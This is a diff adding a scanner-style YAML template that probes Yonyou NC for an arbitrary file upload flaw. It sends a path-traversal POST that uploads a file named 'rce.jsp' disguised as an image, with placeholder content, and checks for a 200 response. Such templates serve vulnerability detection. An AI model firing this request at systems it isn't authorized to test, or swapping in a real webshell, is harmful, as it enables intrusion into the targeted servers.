@@ -1,0 +1,32 @@
+id:
+
+info:
+  name: 用友NC uploadFile 文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /mp/initcfg/../uploadControl/uploadFile
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/94.0.2687.94 Safari/537.36
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6
+    Connection: close
+  data: |
+    ------WebKitFormBoundaryHHaZAYecVOf5sfa6
+    Content-Disposition: form-data; name="file"; filename="rce.jsp"
+    Content-Type: image/jpeg
+  
+    123456
+    ------WebKitFormBoundaryHHaZAYecVOf5sfa6
+    Content-Disposition: form-data; name="submit"
+  
+    上传
+    ------WebKitFormBoundaryHHaZAYecVOf5sfa6--
+response1:
+  headers:
+  body: true
+  code: 200
+requests2:
+response2:
